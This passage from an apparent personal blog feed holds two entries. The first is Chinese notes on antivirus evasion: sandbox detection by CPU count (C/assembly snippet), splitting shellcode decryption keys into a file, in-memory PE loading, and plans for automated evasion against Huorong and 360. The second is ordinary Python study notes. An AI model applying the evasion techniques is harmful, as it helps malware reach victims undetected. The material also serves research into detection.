0xCC&#125;</code>断点，使其不能执行，再放入虚拟机，则不会报毒。</p><p>关键点：shellcode未在内存解密。</p></blockquote><p>测试来看 应该是有把，文件落地的时候，陌生exe文件不让你点击启动，要过他的沙箱，有的时间长大概10s，然后正常再启动，异常就报毒。</p><p>我现在PELoader不会报毒，shellcode会报毒，内存中解密，就被检测到</p><blockquote><p><strong>思考</strong>：当我对demo.exe加自定义壳后，火绒则检测不到，按理说，沙箱动态检测， 肯定会内存扫描，然后报毒的。</p><p>我的答案：应该是加自定义壳后的demo.exe，在火绒沙箱中，启动失败，则火绒未能正确扫描内存。</p><p>猜想原因：自定义壳要获取当前模块句柄，可能在火绒沙箱中，获取失败，即获取到沙箱进程的主模块句柄，而非demo.exe的主模块句柄（沙箱内存加载demo.exe）</p><p>我自定义壳，加壳后，win10启动正常，win7启动失败。</p></blockquote><p>7.24_0:47解决！！！</p><p>上述<strong>思考</strong>中，经过验证，猜想原因错误，正确原因是，我得自定义壳中加了反沙箱，即判断cpu数，小于4则在沙箱中！成功绕过！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//通过判断cpu数量，检测沙箱，在沙箱中则返回false</span><br><span class="hljs-type">bool</span> <span class="hljs-title function_">checkSandBox</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flag=<span class="hljs-number">0</span>;<br>__asm &#123;<br>pushad;<br>mov eax, fs: [<span class="hljs-number">0x30</span>] ;<span class="hljs-comment">//fs寄存器代表TEB，偏移0x30指向PEB</span><br>mov ebx, dword ptr ds : [eax + <span class="hljs-number">0x64</span>] ;<br>mov flag, ebx;<span class="hljs-comment">//记录cpu数量，小于4判定为沙箱。</span><br>popad;<br>&#125;<br><span class="hljs-keyword">if</span> (flag &lt; <span class="hljs-number">4</span>) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>7.24_22:00</p><blockquote><p>总结：样本落地被查杀，不一定是静态查杀，也有可能杀软在你落地瞬间，后台跑了本地沙箱，进行动态查杀。</p><p>绕过沙箱：</p><ul><li>延时执行，但大部门沙箱会hook掉sleep等休眠函数，可以利用for循环。</li><li><strong>环境检测</strong>（常用），沙箱模拟计算机，但比真实计算机有差别，例如：CPU较小、I&#x2F;O设备缺失、特定文件不存在等等，方法较细较广。</li><li>shellcode加密分离，shellcode通过本地文件读取（加密存储）、或者远程下载传入（不落地）。</li></ul></blockquote><p>7.25_20:30</p><blockquote><p>联想电脑管家也是本地沙箱，和火绒类似。</p><ul><li><p>测试1：观察cpu使用情况，可发现样本落地时、或样本第一次运行时，（带本地沙箱的）杀软（火绒）的cpu使用率一瞬间上升，后下降，且在此启动exe时，cpu使用率则不增加，</p><p><strong>结论</strong>：说明只有样本落地、第一次启动时，才使用本地沙箱查杀。之后不再使用（样本本身哈希值不变的情况下）。</p></li><li><p>测试2：在shellcode解密时，添加scanf，由用户命令行输入正确的密钥key，再进行解密。该方法可成功绕过本地沙箱。</p><p><strong>结论</strong>：</p><p><strong>本地沙箱流程</strong>：样本落地前、样本运行前，先过本地沙箱，再正式落地、运行。且不会在exe运行过程中注入进程检查内存。</p><ul><li><strong>shellcode与加载器分离</strong>，可以绕过沙箱的原因</li></ul></li></ul></blockquote><ul><li>shellcode分离-&gt;只分离解密密钥：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//将shellcode解密密钥分开，本地文件存储。</span><br><span class="hljs-comment">//读取本地文件密钥，密钥文件不存在则返回0;</span><br>DWORD <span class="hljs-title function_">check_key</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* keyPath = <span class="hljs-string">&quot;./key.bin&quot;</span>; <span class="hljs-comment">// 输入密钥文件的路径</span><br><br>    FILE* keyFile = fopen(keyPath, <span class="hljs-string">&quot;rb&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (keyFile == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">return</span> fgetc(keyFile);<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>7.26_20:30</p><p>关于exe自动免杀的问题：</p><blockquote><p>目标环境只针对360吗？</p><p>现在可以免杀，需要考虑持久免杀吗？一个月之后被杀软定位特征了怎么办？</p><ul><li>如果不联网，不上传云端，容易持久化</li></ul><p>目前只实现32位的demo，64位exe的PE结构不熟悉、没试过。</p><ul><li>目前只考虑32位</li></ul><p>需要考虑exe有命令行输入吗？</p><ul><li>不考虑</li></ul></blockquote><h2 id="0x4-自动化免杀demo"><a href="#0x4-自动化免杀demo" class="headerlink" title="0x4-自动化免杀demo"></a>0x4-自动化免杀demo</h2><h3 id="1-问题："><a href="#1-问题：" class="headerlink" title="1-问题："></a>1-问题：</h3><ol><li><p>没找到FireEye</p></li><li><p>无法有效站住0x400000的内存空间（用于加载exe）（有局限性PELoader基址0x100000,只剩3072KB内存，只能装载较小的exe）。</p></li><li><p>添加新节区局限，可能没有足够位置添加节表头。</p></li><li><p>不支持免杀有命令行参数的exe。</p></li><li><p>添加一个节区后，在win10虚拟机中（win10企业版-LTSC），无法运行（不添加节区可以运行）。</p><img src="../../../../../AppData/Roaming/Typora/typora-user-images/image-20230803135035823.png" alt="image-20230803135035823" style="zoom: 33%;"><p>测试win10教育版，可以成功执行。</p></li><li><p>自动化免杀，被360查杀、特征库比较大，火绒查杀？？？应该是添加节区后，熵值过高。</p><p>试试：先对shellcode加壳upx，压缩数据.</p></li></ol><p>1-PELoader</p><p><a href="https://citrusice.github.io/posts/from-memory-loading-to-everyting-part-1/">From Memory Loading to Everything - Part 1</a></p><blockquote><p>讲了内存加载的两点注意事项：</p><ul><li><p>将内存加载的模块设置为主模块</p><p>需要修改 <code> (HMODULE)(PVOID)NtCurrentPeb()-&gt;ImageBaseAddress</code>以及LDR链上的EXE模块基址</p></li><li><p>修改TLS 表</p><p>这个没细看，不太懂……</p></li></ul></blockquote><p><a href="https://citrusice.github.io/posts/memory-execute/">使用内存加载躲避静态查杀</a></p><blockquote><p>重点讨论exe内存加载的过程</p><p>其中谈到几点：</p><ul><li>如何加载<strong>无重定位表的PE</strong>：将加载器的ImageBase设为其他地址，为没有重定位表的pe程序让出空间，随后用virtualloc在目标pe程序的默认基址处开辟一块内存用来放置目标pe程序</li><li>加载<strong>带命令行参数的exe</strong>：修改传递给被加载程序的命令行参数。如果只是加载一些木马就不需要考虑命令行参数的问题。</li></ul></blockquote><p>根据需求，本PELoader重点额外做两件事</p><ul><li>支持加载<strong>无重定位表的PE</strong>，即为其申请到<code>0x400000</code>的内存ImageBase</li><li>将内存加载的模块设置为主模块，修改PEB记录的ImageBas和LDR双链记录exe模块的ImageBase（汇编实现）。</li></ul><p><a href="https://bbs.kanxue.com/thread-248962.htm">看雪：[求助]如何让指定内存地址不被占用，可以申请，比如0x400000</a>，注意看下图的回答。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230731174231961.png" alt="image-20230731174231961" style="zoom:50%;"><p>为了使内存加载的exe能申请到地址为<code>0x400000</code>的内存，需要在编译加载器时，设置为固定基址，基址为0x100000;</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230731173849523.png" alt="image-20230731173849523" style="zoom: 33%;"><h3 id="2-AutoBypass-Demo"><a href="#2-AutoBypass-Demo" class="headerlink" title="2-AutoBypass-Demo"></a>2-AutoBypass-Demo</h3><ol><li><p>无法有效站住0x400000的内存空间（用于加载exe）（有局限性PELoader基址0x100000,只剩3072KB内存，只能装载较小的exe）。</p></li><li><p>添加新节区局限，可能没有足够位置添加节表头。</p></li><li><p>不支持免杀有命令行参数的exe。</p></li><li><p>添加一个节区后，在win10虚拟机中（win10企业版-LTSC），无法运行（不添加节区可以运行）。</p><img src="../../../../../AppData/Roaming/Typora/typora-user-images/image-20230803135035823.png" alt="image-20230803135035823" style="zoom: 33%;"><p>测试win10教育版，可以成功执行。</p></li><li><p>自动化免杀，被360查杀、特征库比较大，火绒查杀？？？应该是添加节区后，熵值过高。</p><p>试试：先对shellcode加壳upx，压缩数据.</p></li></ol><ul><li><ul><li></li></ul></li></ul><p>被360查杀，根据这边文章提示：<a href="https://xz.aliyun.com/t/10821">失败mimikatz源码免杀和成功的免杀Windows Defender</a>，</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230803163354393.png" alt="image-20230803163354393" style="zoom: 25%;"><p>测试<strong>360安全卫士</strong>断网之后，就没有反映了，连未免杀的名都文件都不报毒了，直接不响应了。</p><blockquote><p> 应该是360的主要<strong>病毒特征库</strong>在云端，本地<strong>病毒特征库</strong>较小。</p></blockquote><p>测试<strong>360杀毒</strong>，断网之后，功力大减。不过：常见病毒要报毒，免杀之后不报毒。</p><h3 id="3-自动化免杀-改进"><a href="#3-自动化免杀-改进" class="headerlink" title="3-自动化免杀 改进"></a>3-自动化免杀 改进</h3><p><strong>查杀点</strong>：</p><blockquote><p>猜测：</p><p>PELoader代码，有相似度，使查杀评分增高？然后最后一个节区大量未知数据，评分进一步增高，就被判定为病毒木马了。</p><ul><li>而且，莫名添加一个节区，目录项里没有记录，使得目标很明显。</li></ul></blockquote><p><strong>自动化免杀</strong>改进方法：</p><ul><li>将shellcode添加到已有的区段里。<ul><li>末尾的节区：rsrc资源节区，在资源节区开头存放4字节RVA跳转到shellcode密文</li><li>非末尾的节区：需要修改很多，最基本的 修改所有偏移，</li><li>生成PELoader时，固定开辟一个很大的data段，用来存储shellcode密文。</li></ul></li><li>密文嵌入c代码、后台编译。<ul><li>把shellcode密文数据写入到一个头文件中，然后在后台再编译出来。</li></ul></li></ul><h4 id="（1）测试1"><a href="#（1）测试1" class="headerlink" title="（1）测试1"></a>（1）测试1</h4><ol><li>将shellcode密文写入头文件，编译进去。查看是否被免杀。</li><li>查看<code>.h</code>头文件内容格式，查看如何写入。</li></ol><p><strong>查杀点</strong>：</p><ul><li><p>vs编译的PELoader被查杀，vc编译的PELoader免杀。</p><blockquote><p>应该是，vs设置了ImageBase为0x100000，而非正常的0x400000，提高了查杀打分。</p></blockquote></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>window</tag>
      
      <tag>免杀</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023.5.30-python复习笔记</title>
    <link href="/2023/05/30/2023.5.30-python%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/05/30/2023.5.30-python%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>[2023.7.16完结]，记录python复习的笔记，观看b站小甲鱼的<a href="https://www.bilibili.com/video/BV1c4411e77t">《零基础入门学习Python》最新版</a>，倍速刷过一遍，记录一些遗忘的知识点。</p><span id="more"></span><h1 id="2023-5-30-python复习笔记"><a href="#2023-5-30-python复习笔记" class="headerlink" title="2023.5.30-python复习笔记"></a>2023.5.30-python复习笔记</h1><p>[toc]</p><h2 id="一、变量和字符串"><a href="#一、变量和字符串" class="headerlink" title="一、变量和字符串"></a>一、变量和字符串</h2><h3 id="1、变量交换"><a href="#1、变量交换" class="headerlink" title="1、变量交换"></a>1、变量交换</h3><img src="https://gitee.com/cht1/Image/raw/master/image-20230601104856188.png" alt="image-20230601104856188" style="zoom:50%;"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">x=<span class="hljs-number">3</span><br>y=<span class="hljs-number">5</span><br><span class="hljs-comment">#交还x，y的值</span><br>x,y = y,x<br></code></pre></td></tr></table></figure><h3 id="2、随机数-random"><a href="#2、随机数-random" class="headerlink" title="2、随机数 random"></a>2、随机数 random</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">random.random()<span class="hljs-comment">#返回一个随机数</span><br>random.randint(a,b)<span class="hljs-comment">#返回一个a到b之间的随机数</span><br>x=random.getstate()<span class="hljs-comment">#获取随机数种子</span><br>random.setstate(x)<span class="hljs-comment">#设置随机数种子</span><br></code></pre></td></tr></table></figure><p>获取了随机数种子，可实现伪随机数攻击。</p><h3 id="3、数字类型"><a href="#3、数字类型" class="headerlink" title="3、数字类型"></a>3、数字类型</h3><p>python的浮点数表示存在误差</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230601113642517.png" alt="image-20230601113642517" style="zoom:50%;"><p>用decimal库可以强制精确小数。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230601114040628.png" alt="image-20230601114040628" style="zoom:50%;"><p><strong>科学计数法</strong>：如下图，e-05表示10的负5次方，即5*10^-5^。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230601114110681.png" alt="image-20230601114110681" style="zoom:50%;"><h3 id="4、计算符号"><a href="#4、计算符号" class="headerlink" title="4、计算符号"></a>4、计算符号</h3><p>算数除法：<code>\</code></p><p>向下取整：<code>\\</code></p><p>取模：<code>%</code></p><p>求绝对值：<code>abs(x)</code></p><p><code>divmod(a,b)</code>： 函数把除数和余数运算结果结合起来，返回一个包含商和余数的元组(a &#x2F;&#x2F; b, a % b)。</p><p>幂运算：<code>a**b</code>，a的b次方；</p><p><code>pow(a,b)</code>，a的b次方；</p><p><code>pow(a,b,c)</code>：a的b次方 再求c的模。</p><p><strong>逻辑运算符号</strong>：<code>and</code> ，<code>or</code>，<code>not</code>：与或非</p><h2 id="二、分支和循环"><a href="#二、分支和循环" class="headerlink" title="二、分支和循环"></a>二、分支和循环</h2><h3 id="1、分支结构"><a href="#1、分支结构" class="headerlink" title="1、分支结构"></a>1、分支结构</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> condition1:<br>    <span class="hljs-comment">#分之一</span><br><span class="hljs-keyword">elif</span> condition2:<br>    <span class="hljs-comment">#分支二</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-comment">#分之三</span><br></code></pre></td></tr></table></figure><p>求最大值、最小值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">a=<span class="hljs-number">3</span><br>b=<span class="hljs-number">5</span><br>small=a <span class="hljs-keyword">if</span> a&lt;b <span class="hljs-keyword">else</span> b<span class="hljs-comment">#如果a&lt;b则small=a，否则small=b</span><br>big=a <span class="hljs-keyword">if</span> a&gt;b <span class="hljs-keyword">else</span> b<span class="hljs-comment">#如果a&gt;b则max=a，否则big=b</span><br></code></pre></td></tr></table></figure><p>简写多行分支</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">s = <span class="hljs-number">60</span><br>l = (<span class="hljs-string">&#x27;D&#x27;</span> <span class="hljs-keyword">if</span> <span class="hljs-number">0</span>&lt;=s&lt;<span class="hljs-number">60</span> <span class="hljs-keyword">else</span><br>     <span class="hljs-string">&#x27;C&#x27;</span> <span class="hljs-keyword">if</span> s&lt;<span class="hljs-number">70</span> <span class="hljs-keyword">else</span><br>     <span class="hljs-string">&#x27;B&#x27;</span> <span class="hljs-keyword">if</span> s&lt;<span class="hljs-number">80</span> <span class="hljs-keyword">else</span><br>     <span class="hljs-string">&#x27;A&#x27;</span> <span class="hljs-keyword">if</span> s&lt;<span class="hljs-number">100</span> <span class="hljs-keyword">else</span><br>     <span class="hljs-string">&#x27;S&#x27;</span> <span class="hljs-keyword">if</span> s==<span class="hljs-number">100</span> <span class="hljs-keyword">else</span><br>     <span class="hljs-string">&quot;请输入0~100之间的数&quot;</span>)<br>l<br><span class="hljs-string">&#x27;C&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="2、while循环结构"><a href="#2、while循环结构" class="headerlink" title="2、while循环结构"></a>2、while循环结构</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">while</span> condition:<br>    <span class="hljs-comment">#循环</span><br>    <br><span class="hljs-keyword">break</span><span class="hljs-comment">#退出循环</span><br><span class="hljs-keyword">continue</span><span class="hljs-comment">#结束此轮循环，进入下一轮循环.</span><br><br></code></pre></td></tr></table></figure><p>注意<code>else</code>可以接在while语句后面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">i=<span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> i&lt;=<span class="hljs-number">7</span>:<br>    a = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;今天有好好学习嘛?&quot;</span>)<br>    <span class="hljs-keyword">if</span> a!=<span class="hljs-string">&#x27;有&#x27;</span>:<br>        <span class="hljs-keyword">break</span><br>    i+=<span class="hljs-number">1</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;已经学习7天了！真棒&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="3、for循环结构"><a href="#3、for循环结构" class="headerlink" title="3、for循环结构"></a>3、for循环结构</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> 变量 <span class="hljs-keyword">in</span> 可迭代对象<br><span class="hljs-comment">#例如</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;Fish&quot;</span>:<br>    <span class="hljs-built_in">print</span>(i)<br><span class="hljs-comment">#打印如下：   </span><br>F<br>i<br>s<br>h<br></code></pre></td></tr></table></figure><p><code>range</code>函数用法</p><blockquote><p>range(stop)</p><p>range(start, stop)</p><p>range(start, stop, step)</p></blockquote><p><strong>包含start，不包含stop</strong>，注意，当<code>step</code>为负数时，表示<strong>逆序</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>,<span class="hljs-number">3</span>):<br>    <span class="hljs-built_in">print</span>(i)<br><span class="hljs-comment">#打印</span><br><span class="hljs-number">0</span><br><span class="hljs-number">3</span><br><span class="hljs-number">6</span><br><span class="hljs-number">9</span><br><span class="hljs-comment">#例子</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,n):<br>        <span class="hljs-keyword">if</span> n%x==<span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n&quot;</span>,<span class="hljs-string">&quot;=&quot;</span>,<span class="hljs-string">&quot;*&quot;</span>,n//x)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(n,<span class="hljs-string">&quot;是一个素数&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="三、列表"><a href="#三、列表" class="headerlink" title="三、列表"></a>三、列表</h2><h3 id="1、列表切片"><a href="#1、列表切片" class="headerlink" title="1、列表切片"></a>1、列表切片</h3><p>类似C语言数组</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">a = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-string">&quot;123456&quot;</span>]<br>a[start:end:step]<br><span class="hljs-comment">#包含start，不包含end。注意：start表示下标，从0开始。</span><br></code></pre></td></tr></table></figure><p>注意，当<code>step</code>为负数时，表示<strong>逆序</strong>。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230602171818673.png" alt="image-20230602171818673" style="zoom:50%;"><h3 id="2、列表-增删查改"><a href="#2、列表-增删查改" class="headerlink" title="2、列表-增删查改"></a>2、列表-增删查改</h3><p><strong>末尾</strong>增加一个元素：<code>a.append(一个可迭代对象)</code></p><p><strong>末尾</strong>增加多个元素：<code>a.extend([增加列表])</code>、<code>a.[len(a):]=[增加列表]</code></p><p><strong>指定位置</strong>插入：<code>a.insert(position,value)</code></p><p>删除<strong>指定元素</strong>：<code>a.remove(value)</code>，如果没有value值，则报错</p><p>删除<strong>指定位置</strong>：<code>a.pop(position)</code></p><p>清空列表：<code>a.clear()</code></p><p>单个替换：<code>a[1]=value</code></p><p>多个替换：<code>a[6:]=[列表]</code>，从第6个后面全部替换为<strong>列表</strong>。</p><p><strong>从小到大</strong>排序：<code>a.sort()</code></p><p>逆序列表：<code>a.reverse()</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">list</span>.sort(self,key=<span class="hljs-literal">None</span>,reverse=<span class="hljs-literal">False</span>)<span class="hljs-comment">#对原列表进行排序</span><br></code></pre></td></tr></table></figure><p>计数：<code>a.count(value)</code>，返回列表a中value值的个数</p><p>返回值的下表：<code>a.index(value)</code>，只返回value第一次出现的下表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">a[a.index(value1)] = value2<span class="hljs-comment">#将value1替换为value2</span><br>a.index(value,start,end)<span class="hljs-comment">#从下标start开始到end下标，查找value</span><br></code></pre></td></tr></table></figure><p>复制一整个列表：<code>b = a.copy()</code>等价与<code>b=a[:]</code></p><blockquote><p> 不等价于<code>b=a</code></p><p><code>b=a.copy()</code>，b是复制到一个独立的内存，而<code>c=a</code>，表示c指向a的内存，只是一个引用。</p><p>但注意，这个“独立”，只适用于一维数组，无法对二维、三维……之后的数据进行复制，还是原引用。（浅拷贝与深拷贝的关系。）</p></blockquote><h3 id="3、二维列表"><a href="#3、二维列表" class="headerlink" title="3、二维列表"></a>3、二维列表</h3><img src="https://gitee.com/cht1/Image/raw/master/image-20230603154155014.png" alt="image-20230603154155014" style="zoom:50%;"><p>初始化一个二维列表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#正确方法</span><br>A=[<span class="hljs-number">0</span>]*<span class="hljs-number">3</span> <span class="hljs-comment">#A=[0, 0, 0]</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    A[i]=[<span class="hljs-number">0</span>]*<span class="hljs-number">3</span><br><span class="hljs-comment">#A=[[0, 0, 0],[0, 0, 0],[0, 0, 0]]</span><br><br><span class="hljs-comment">#错误方法</span><br>B=[[<span class="hljs-number">0</span>]*<span class="hljs-number">3</span>]*<span class="hljs-number">3</span><span class="hljs-comment">#B=[[0, 0, 0], [0, 0, 0], [0, 0, 0]]</span><br></code></pre></td></tr></table></figure><p>两种列表初始化方法，其内存布局是不同的。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230603155914807.png" alt="image-20230603155914807" style="zoom:50%;"><h3 id="4、浅拷贝与深拷贝"><a href="#4、浅拷贝与深拷贝" class="headerlink" title="4、浅拷贝与深拷贝"></a>4、浅拷贝与深拷贝</h3><p>当列表为二维及以上的列表是，则需要考虑是否用深拷贝。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> copy<br></code></pre></td></tr></table></figure><p>列表y<strong>浅拷贝</strong>x列表，则修改y列表，同时x列表也会被修改。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230603162648014.png" alt="image-20230603162648014" style="zoom:50%;"><p>列表z<strong>深拷贝</strong>x列表，则修改z列表，不会修改x列表。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230603162908911.png" alt="image-20230603162908911" style="zoom:50%;"><blockquote><p>python<strong>默认是浅拷贝</strong>。</p></blockquote><h3 id="5、列表推导式"><a href="#5、列表推导式" class="headerlink" title="5、列表推导式"></a>5、列表推导式</h3><p>直接创建一个新的列表，再复制。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">oho<br>&gt;&gt;&gt;[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]<br>oho = [i*<span class="hljs-number">2</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> oho]<br>oho<br>&gt;&gt;&gt;[<span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">10</span>]<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">code = [<span class="hljs-built_in">ord</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;FishC&quot;</span>]<br>code<br>&gt;&gt;&gt;[<span class="hljs-number">70</span>, <span class="hljs-number">105</span>, <span class="hljs-number">115</span>, <span class="hljs-number">104</span>, <span class="hljs-number">67</span>]<br></code></pre></td></tr></table></figure><p>内置函数：<code>ord(c)</code>：将单个字符转换成编码（ASCLL）。</p><p><strong>矩阵操作</strong>：取二维矩阵某一列的元素</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">martrix = [[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],<br>           [<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>],<br>           [<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>]]<br>col2 = [row[<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> martrix]<br>col2<br>&gt;&gt;&gt;[<span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>]<br></code></pre></td></tr></table></figure><p>为列表推导式，添加<code>if</code>条件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#初始化一个0~10之间的偶数序列</span><br>even = [ i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>) <span class="hljs-keyword">if</span> i%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>]<br>even<br>&gt;&gt;&gt;[<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span 